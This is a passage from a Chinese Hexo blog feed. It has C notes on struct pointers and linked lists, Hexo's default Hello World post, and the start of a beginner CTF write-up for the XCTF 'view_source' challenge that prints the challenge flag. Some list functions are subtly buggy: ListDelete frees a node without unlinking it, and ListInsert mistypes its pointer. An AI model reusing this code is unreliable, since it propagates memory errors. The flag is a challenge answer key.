class="line">perror(<span class="string">"malloc"</span>);</span><br><span class="line"><span class="keyword">return</span><span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">sprintf</span>(a,<span class="string">"%s"</span>,<span class="string">"HelloWorld\n"</span>);<span class="comment">//"HelloWorld\n"写入a指向的地址</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\n"</span>,a);<span class="comment">//输出上边写入a的字符串</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);<span class="comment">//释放掉使用的内存地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//例2有无内存泄露？</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而且，作为一名合格的码农，我们应当对一些特殊情况进行特殊处理，如这里的 malloc 函数若调用失败，则直接让程序退出，而不是让其运行下去，否则可能会造成更大的 bug，而且也不利于我们根据返回值进行 debug。</p>
<h2 id="结构体指针-gt-的使用"><a href="#结构体指针-gt-的使用" class="headerlink" title="结构体指针-&gt;的使用"></a>结构体指针-&gt;的使用</h2><p>除了我们通过<code>结构体变量名.成员名</code>的方式引用结构体变量中的成员，我们还可以使用指针。<br>要想学会-&gt;这种指针的使用，首先我们就要学会一般的结构体指针使用方式：<br><code>(* 指针变量名).成员名</code><br>这个指针变量定义成什么类型呢？<br>只能定义成结构体类型，且指向什么结构体类型的结构体变量，就要定义成什么样的结构体类型。<br>比如指向 struct STUDENT 类型的结构体变量，那么指针变量就一定要定义成 struct STUDENT* 类型。<br>example:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AGE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> year;</span><br><span class="line">    <span class="keyword">int</span> month;</span><br><span class="line">    <span class="keyword">int</span> day;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">STUDENT</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>];  <span class="comment">//姓名</span></span><br><span class="line">    <span class="keyword">int</span> num;  <span class="comment">//学号</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">AGE</span> <span class="title">birthday</span>;</span>  <span class="comment">//生日</span></span><br><span class="line">    <span class="keyword">float</span> score;  <span class="comment">//分数</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">STUDENT</span> <span class="title">student1</span>;</span> <span class="comment">/* 用struct STUDENT结构体类型定义结构体变量student1*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">STUDENT</span> * <span class="title">p</span> = <span class="title">NULL</span>;</span>  <span class="comment">/* 定义一个struct STUDENT结构体类型的指针变量p*/</span></span><br><span class="line">    p = &amp;student1;  <span class="comment">/* p指向结构体变量student1的首地址, 即第一个成员的地址*/</span></span><br><span class="line">    <span class="built_in">strcpy</span>((* p).name, <span class="string">"小明"</span>);  <span class="comment">//(* p).name等价于student1.name</span></span><br><span class="line">    (* p).birthday.year = <span class="number">1989</span>;</span><br><span class="line">    (* p).birthday.month = <span class="number">3</span>;</span><br><span class="line">    (* p).birthday.day = <span class="number">29</span>;</span><br><span class="line">    (* p).num = <span class="number">1207041</span>;</span><br><span class="line">    (* p).score = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"name : %s\n"</span>, (* p).name);  <span class="comment">//(* p).name不能写成p,即使p指向的是student1.name的地址。</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"birthday : %d-%d-%d\n"</span>, (* p).birthday.year, (* p).birthday.month, (* p).birthday.day);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num : %d\n"</span>, (* p).num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"score : %.1f\n"</span>, (* p).score);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">name : 小明</span><br><span class="line">birthday : <span class="number">1989</span><span class="number">-3</span><span class="number">-29</span></span><br><span class="line">num : <span class="number">1207041</span></span><br><span class="line">score : <span class="number">100.0</span></span><br></pre></td></tr></table></figure>

<p>注意，_ p 两边的括号不可省略，因为成员运算符“.”的优先级高于指针运算符“ _ ”，所以如果 _ p 两边的括号省略的话，那么 _ p.num 就等价于 _ (p.num) 了。<br>从该程序也可以看出：因为指针变量 p 指向的是结构体变量 student1 第一个成员的地址，即字符数组 name 的首地址，所以 p 和 (_ p).name 是等价的。<br>但是，“等价”仅仅是说它们表示的是同一个内存单元的地址，但它们的类型是不同的。指针变量 p 是 struct STUDENT* 型的，而 (* p).name 是 char* 型的。所以在 strcpy 中不能将 (* p).name 改成 p。用 %s 进行输入或输出时，输入参数或输出参数也只能写成 (_ p).name 而不能写成 p。<br>同样，虽然 &amp;student1 和 student1.name 表示的是同一个内存单元的地址，但它们的类型是不同的。&amp;student1 是 struct STUDENT_ 型的，而 student1.name 是 char* 型的，所以在对 p 进行初始化时，“p=&amp;student1；”不能写成“p=student1.name”。因为 p 是 struct STUDENT* 型的，所以不能将 char* 型的 student1.name 赋给 p。C 语言是一门强数据类型的语言，就在这里体现的淋漓尽致。<br>此外,为了使用的方便和直观，我们可以直接用<code>指针变量名-&gt;成员名</code>来代替。<br>p-&gt;num 的含义是：指针变量 p 所指向的结构体变量中的 num 成员。p-&gt;num 最终代表的就是 num 这个成员中的内容。<br>下面，我们可以用<code>指针变量名-&gt;成员名</code>的形式对我们刚刚的代码进行修改：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AGE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> year;</span><br><span class="line">    <span class="keyword">int</span> month;</span><br><span class="line">    <span class="keyword">int</span> day;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">STUDENT</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>];  <span class="comment">//姓名</span></span><br><span class="line">    <span class="keyword">int</span> num;  <span class="comment">//学号</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">AGE</span> <span class="title">birthday</span>;</span>  <span class="comment">/* 用struct AGE结构体类型定义结构体变量birthday, 生日*/</span></span><br><span class="line">    <span class="keyword">float</span> score;  <span class="comment">//分数</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">STUDENT</span> <span class="title">student1</span>;</span> <span class="comment">/* 用struct STUDENT结构体类型定义结构体变量student1*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">STUDENT</span> * <span class="title">p</span> = <span class="title">NULL</span>;</span>  <span class="comment">/* 定义struct STUDENT结构体类型的指针变量p*/</span></span><br><span class="line">    p = &amp;student1;  <span class="comment">/* p指向结构体变量student1的首地址, 即第一项的地址*/</span></span><br><span class="line">    <span class="built_in">strcpy</span>(p-&gt;name, <span class="string">"小明"</span>);</span><br><span class="line">    p-&gt;birthday.year = <span class="number">1989</span>;</span><br><span class="line">    p-&gt;birthday.month = <span class="number">3</span>;</span><br><span class="line">    p-&gt;birthday.day = <span class="number">29</span>;</span><br><span class="line">    p-&gt;num = <span class="number">1207041</span>;</span><br><span class="line">    p-&gt;score = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"name : %s\n"</span>, p-&gt;name);  <span class="comment">//p-&gt;name不能写成p</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"birthday : %d-%d-%d\n"</span>, p-&gt;birthday.year, p-&gt;birthday.month, p-&gt;birthday.day);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num : %d\n"</span>, p-&gt;num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"score : %.1f\n"</span>, p-&gt;score);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出同上。</p>
<h2 id="链表的基本概念及简单使用"><a href="#链表的基本概念及简单使用" class="headerlink" title="链表的基本概念及简单使用"></a>链表的基本概念及简单使用</h2><p>学了三个月，终于学到了第一种数据结构类型：链表。<br>那么，链表它到底是个啥？<br>链表，链表，首先它得是个线性表。根据《数据结构》书中介绍，一个线性表是 n 个数据元素的有限序列，它的长度可根据需要增长或缩短，还有一系列对线性表的操作。线性表可分为顺序存储结构和链式存储结构两种。<br>那么今天所学习的链表，全称就叫链式存储结构线性表。<br>线性链表可分为单链表，循环链表，双链表。</p>
<p>线性表特点是用一组任意的存储单元存储线性表的数据元素，同时还存储一个指向后继信息的信息，这两部分信息组成为结点。<br>结点包含两部分数据域和指针域。指针域存储信息成为指针或链。链表中只包含一个指针域，故称为单链表。<br><img src="https://gss3.bdstatic.com/7Po3dSag_xI4khGkpoWK1HF6hhy/baike/c0%3Dbaike92%2C5%2C5%2C92%2C30/sign=f56b157cdeca7bcb6976cf7ddf600006/b2de9c82d158ccbfebe4998510d8bc3eb1354130.jpg" alt="单链表"></p>
<p>下面通过 c 语言实现单链表的基本操作：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ERROR 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> Status;</span><br><span class="line"><span class="comment">//上述是一些重命名和宏定义</span></span><br><span class="line"><span class="comment">//单链表的存储结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">    ElemType data;  <span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">next</span>;</span> <span class="comment">//指针域</span></span><br><span class="line">&#125;LNode，*LinkList;</span><br></pre></td></tr></table></figure>

<p>读取链表第 i 个元素的数据：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">Status <span class="title">GetElem</span><span class="params">(LinkList L, <span class="keyword">int</span> i, ElemType *e)</span></span>&#123;</span><br><span class="line">    LinkList p;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    p = L-&gt;next;</span><br><span class="line">    j=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; j&lt;i)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p || j&gt;i)&#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    * e = p-&gt;data;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在带头结点的链表 L 的第 i 个位置之前插入元素 e:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">Status <span class="title">ListInsert</span><span class="params">(LinkList &amp;L, <span class="keyword">int</span> i, ElemType e)</span></span>&#123;</span><br><span class="line">    LNode p;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    p = L;</span><br><span class="line">    j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; j&lt;i<span class="number">-1</span>)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p || j&gt;i<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    LinkList s;</span><br><span class="line">    s = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    s-&gt;data = e;</span><br><span class="line">    s-&gt;next = p-&gt;next;</span><br><span class="line">    p-&gt;next =s;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在带头结点的链表 L，删除第 i 个位置的元素，并由 e 返回其值:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">Status <span class="title">ListDelete</span><span class="params">(LinkList &amp;L, <span class="keyword">int</span> i, ElemType &amp;e)</span></span>&#123;</span><br><span class="line">    LNode p;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    p = L;</span><br><span class="line">    j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; j&lt;i<span class="number">-1</span>)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!(p-&gt;next) || j&gt;i<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    LinkList q;</span><br><span class="line">    q = p-&gt;next;</span><br><span class="line">    p = q-&gt;next;</span><br><span class="line">    e = q-&gt;data;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>循环链表是另外一种存储形式的链式存储结构，特点是表中最后一个结点的指针域指向头结点，与单链表比较相像，故不再赘述。<br>双向链表：是指针域指向前驱结点和后继结点。<br>存储结构为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span> * <span class="title">prior</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span> * <span class="title">next</span>;</span></span><br><span class="line">&#125;DuLNode, * DuLinkList;</span><br></pre></td></tr></table></figure>

<h2 id="链表延伸"><a href="#链表延伸" class="headerlink" title="链表延伸"></a>链表延伸</h2><p>1.编程创建一个单链表。可不断读取用户输入的整数并存储进链表里。并在最后将链表里面的数据打印出来。 2.编程实现：将上述任务中已经创建完毕的单链表逆置（如将 1-&gt;2-&gt;3-&gt;4-&gt;null 逆置为 4-&gt;3-&gt;2-&gt;1-&gt;）</p>
<h3 id="程序代码-2"><a href="#程序代码-2" class="headerlink" title="程序代码"></a>程序代码</h3><p>简明起见，我将两个任务写在一个程序里了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SUCCESS 10000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FAILURE 10001</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	ElemType data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;Link;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">InitLink</span><span class="params">(Link** l)</span><span class="comment">//初始化链表</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == l)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line">	* l = (Link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Link));</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == * l)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line">	(* l)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	(* l)-&gt;data = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">InsertLink</span><span class="params">(Link* l, <span class="keyword">int</span> place, ElemType e)</span><span class="comment">//插入链表</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> k = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == l)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (place &gt; l-&gt;data + <span class="number">1</span> || place &lt;= <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line">	Link* head = l;</span><br><span class="line">	<span class="keyword">while</span> (k &lt; place)</span><br><span class="line">	&#123;</span><br><span class="line">		k++;</span><br><span class="line">		l = l-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	Link* tmp = (Link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Link));</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == tmp)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line">	tmp-&gt;next = l-&gt;next;</span><br><span class="line">	l-&gt;next = tmp;</span><br><span class="line">	tmp-&gt;data = e;</span><br><span class="line">	head-&gt;data++;</span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">TraverseLink</span><span class="params">(Link* l)</span><span class="comment">//遍历链表</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> length;</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == l)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line">	length = l-&gt;data;</span><br><span class="line">	<span class="keyword">while</span> (length &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		length--;</span><br><span class="line">		l = l-&gt;next;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d "</span>, l-&gt;data);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ReverseList</span><span class="params">(Link* L)</span><span class="comment">//逆置链表</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Link* curnode = L-&gt;next; <span class="comment">//当前节点，指向表头</span></span><br><span class="line">	Link* temp = curnode-&gt;next; <span class="comment">//临时节点</span></span><br><span class="line"></span><br><span class="line">	curnode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	L-&gt;next = curnode;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (temp != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		curnode = temp;</span><br><span class="line">		temp = curnode-&gt;next;</span><br><span class="line">		curnode-&gt;next = L-&gt;next;</span><br><span class="line">		L-&gt;next = curnode;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SortInsert</span><span class="params">(Link* l, ElemType e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> length, place;</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == l)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line">	Link* head = l;</span><br><span class="line">	length = l-&gt;data;</span><br><span class="line">	l = l-&gt;next;</span><br><span class="line">	place = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == length)&#123;</span><br><span class="line">	 	InsertLink(head, place + <span class="number">1</span>, e);</span><br><span class="line">	 &#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (place &lt; length)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (e &lt; l-&gt;data)</span><br><span class="line">		&#123;</span><br><span class="line">			InsertLink(head, place + <span class="number">1</span>, e);</span><br><span class="line">			flag = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			l = l-&gt;next;</span><br><span class="line">			place++;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="number">1</span> == flag)</span><br><span class="line">	&#123;</span><br><span class="line">		InsertLink(head, length + <span class="number">1</span>, e);</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Link* <span class="built_in">list</span>;</span><br><span class="line">	ElemType e;</span><br><span class="line"></span><br><span class="line">	InitLink(&amp;<span class="built_in">list</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Please input numbers,input other character to end!\n"</span>);</span><br><span class="line">	<span class="keyword">while</span>(scanf_s(<span class="string">"%d"</span>,&amp;e) == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Please input numbers,input other character to end!\n"</span>);</span><br><span class="line">		SortInsert(<span class="built_in">list</span>, e);</span><br><span class="line">		<span class="comment">// printf("Length = %d\n", list-&gt;data);</span></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The output is :"</span>);</span><br><span class="line">	TraverseLink(<span class="built_in">list</span>);</span><br><span class="line">	ReverseList(<span class="built_in">list</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nThe  reverse List output is: "</span>);</span><br><span class="line">	TraverseLink(<span class="built_in">list</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="程序运行结果"><a href="#程序运行结果" class="headerlink" title="程序运行结果"></a>程序运行结果</h3><p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/%E9%93%BE%E8%A1%A8%E8%BE%93%E5%87%BA%E7%BB%93%E6%9E%9C.png" alt="程序运行结果"></p>
<h2 id="Leetcode"><a href="#Leetcode" class="headerlink" title="Leetcode"></a>Leetcode</h2><p>都不会做<br>好难啊<br>我太菜了<br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/29412e0a494585b8.jpg" alt=""><br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/924112618.png" alt=""></p>
]]></content>
      <tags>
        <tag>C</tag>
        <tag>Learning</tag>
        <tag>Function&amp;Pointer</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2019/10/04/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<a id="more"></a>

<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>攻防世界-Web新手村-Writeup</title>
    <url>/2020/04/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web%E6%96%B0%E6%89%8B%E6%9D%91-Writeup/</url>
    <content><![CDATA[<p>XCTF线上练习网站<a href="https://adworld.xctf.org.cn/" target="_blank" rel="noopener">攻防世界</a>，新手的Web方向新手村Writeup。（总之很新就对了）</p>
<p>第一次写CTF题，也是第一次写Writeup，体验良好</p>
<a id="more"></a>

<h2 id="T1-view-source"><a href="#T1-view-source" class="headerlink" title="T1 view_source"></a>T1 view_source</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。</p>
<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入在线题目场景后，发现鼠标右键失效……行呗，直接按 <code>F12</code> ，切换到 <code>Elements</code> 栏，查看网页源代码完事。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Where is the FLAG<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.oncontextmenu=<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"return false"</span>)</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.onselectstart=<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"return false"</span>)</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>FLAG is not here<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- cyberpeace&#123;246200d6931d72f4da7a2b590b08b595&#125; --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现这个网页是通过使用脚本来达到使鼠标右键失效的。并且在注释中发现了flag:</p>
